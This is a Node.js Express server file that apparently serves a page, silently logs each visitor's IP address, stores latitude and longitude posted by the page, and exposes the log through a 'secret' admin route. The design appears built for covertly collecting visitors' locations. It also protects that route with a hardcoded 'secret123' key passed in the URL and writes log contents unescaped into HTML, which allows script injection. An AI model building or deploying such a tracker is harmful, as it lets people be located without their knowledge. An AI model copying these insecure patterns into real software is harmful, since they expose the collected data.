const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");

const app = express();

// Use Render-assigned port or fallback to 3000
const port = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(express.static(__dirname));

// ✅ Log visit when someone opens the page
app.get("/", (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const log = `${new Date().toISOString()} - PAGE OPENED from IP: ${ip}\n`;

  fs.appendFile("coordinates.txt", log, (err) => {
    if (err) console.error("Error logging visit:", err);
  });

  res.sendFile(path.join(__dirname, "index.html"));
});

// ✅ Save coordinates and IP to file
app.post("/coordinates", (req, res) => {
  const { latitude, longitude } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  const log = `${new Date().toISOString()} - LOCATION SENT from IP: ${ip} | Lat: ${latitude}, Lon: ${longitude}\n`;

  fs.appendFile("coordinates.txt", log, (err) => {
    if (err) {
      console.error("Error saving coordinates:", err);
      return res.status(500).send("Failed to save.");
    }
    res.status(200).send("Coordinates saved.");
  });
});

// ✅ Secret admin page to view logs
app.get("/admin", (req, res) => {
  const key = req.query.key;
  const ADMIN_KEY = "secret123"; // 🔐 Set your admin password

  if (key !== ADMIN_KEY) {
    return res.status(403).send("Access Denied");
  }

  fs.readFile("coordinates.txt", "utf8", (err, data) => {
    if (err) {
      return res.status(500).send("Error reading coordinates.");
    }

    res.send(`
      <h2>Logged Coordinates</h2>
      <pre>${data}</pre>
    `);
  });
});

// ✅ Start the server
app.listen(port, () => {
  console.log(`✅ Server running on http://localhost:${port}`);
});
